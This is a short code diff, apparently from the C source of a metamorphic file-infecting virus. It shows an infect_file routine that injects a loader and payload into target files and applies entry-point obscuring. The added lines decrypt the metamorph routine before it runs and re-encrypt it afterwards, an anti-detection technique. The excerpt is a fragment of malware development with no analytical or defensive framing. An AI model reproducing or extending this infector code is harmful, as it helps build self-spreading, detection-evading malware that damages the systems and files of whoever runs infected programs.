@@ -115,7 +115,9 @@ static void	infect_file(char *path, t_fingerprint *fingerprint, t_info *info)
 	inject_loader(info);
 	inject_payload(info);
 	inject_bis(info);
+	key = decrypt_func(info, &metamorph, info->tab_addr[22] - info->tab_addr[21], 21);
 	metamorph(info, fingerprint);
+	reencrypt_func(info, &metamorph, info->tab_addr[22] - info->tab_addr[21], key);
 	key = decrypt_func(info, &epo_parsing, info->tab_addr[9] - info->tab_addr[8], 8);
 	epo_parsing(info);
 	reencrypt_func(info, &epo_parsing, info->tab_addr[9] - info->tab_addr[8], key);
